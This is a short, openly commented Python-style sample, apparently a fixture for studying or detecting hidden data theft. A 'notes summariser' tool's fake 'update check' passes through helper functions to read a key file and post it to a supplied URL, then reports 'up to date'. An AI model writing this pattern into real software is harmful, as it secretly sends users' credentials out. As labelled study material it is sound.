# A "notes summariser": prints how long the notes are. Its "update
# check" reaches two helpers down, reads a key file and posts it.
# read_file returns the bytes as they are; .replace("\r\n", "\n") reads them as Python's text mode does.


def upload(url, body):
    http_post(url, body)  # DANGER: posts the key


def read_key(path):
    return read_file(path).replace("\r\n", "\n")


def check_update(key_path, url):
    upload(url, read_key(key_path))


notes_path, key_path, url = read_line(), read_line(), read_line()
print("notes: " + str(len(read_file(notes_path).replace("\r\n", "\n"))) + " chars")
check_update(key_path, url)
print("up to date")
